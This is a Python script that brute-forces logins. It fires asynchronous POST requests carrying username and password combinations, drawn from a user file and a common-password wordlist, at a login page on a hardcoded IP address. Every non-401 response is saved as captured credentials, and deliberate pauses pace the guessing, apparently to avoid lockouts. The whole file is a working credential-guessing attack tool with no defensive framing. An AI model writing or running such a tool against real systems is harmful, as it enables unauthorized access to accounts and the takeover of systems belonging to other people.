import aiohttp
import asyncio
import time

### Rate Limit Knobs ###
rate_limit_every_user = 30  # How long to pause after each user (in secs)
nth_user = 50   # Take a longer pause every nth user
rate_limit_every_nth_user = 300  # How long to pause every nth user (in secs)
rate_limit_on_exception = 900  # How long to pause when an exception is encountered (in secs)

### Target Server Configs ###
login_url = 'http://54.206.178.157:8084/classified.html'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

### Wordlists ###
user_filename = './users.txt'
pw_filename = './xato-net-10-million-passwords-1000.txt'


async def bruteforce_login(session, user, pw):
    payload = f'username={user}&password={pw}'
    async with session.post(login_url, headers=headers, data=payload) as resp:
        # *** Write to output file every successful request ***
        if resp.status != 401:
            print(f'############## SUCCESS!!! -> {user}:{pw} ##############')
            writeToFile("output.txt", user + ":" + pw + " -> " + str(resp.status))    

async def main():
    async with aiohttp.ClientSession() as session:

        # Read usernames
        userfile = open(user_filename, 'r')
        Users = userfile.readlines()
        # Read passwords
        passwordfile = open(pw_filename, 'r')
        Passwords = passwordfile.readlines()
        
        i = 0
        for user in Users:
            try:
                tasks = []
                start_time = time.time()
                user = user.strip()
                print(f'Brute forcing user: {user} ...')
                for pw in Passwords:
                    pw = pw.strip()
                    tasks.append(asyncio.ensure_future(bruteforce_login(session, user, pw)))

                await asyncio.gather(*tasks)
                # Execution time for this user
                print("--- %s seconds ---" % (time.time() - start_time))
                # Backing off a bit...
                time.sleep(rate_limit_every_user)
                i+=1

                # Take a longer pause every nth user
                if i%nth_user == 0:
                    print(f'***** Taking a longer break every {nth_user}th user... *****')
                    time.sleep(rate_limit_every_nth_user)
            except:
                print("Exception encountered! Pausing execution...")
                writeToFile("error.txt", user)
                time.sleep(rate_limit_on_exception)

def writeToFile(filename, text):
    f = open(filename, "a")       
    f.write(text + "\n")
    f.close()


asyncio.run(main())

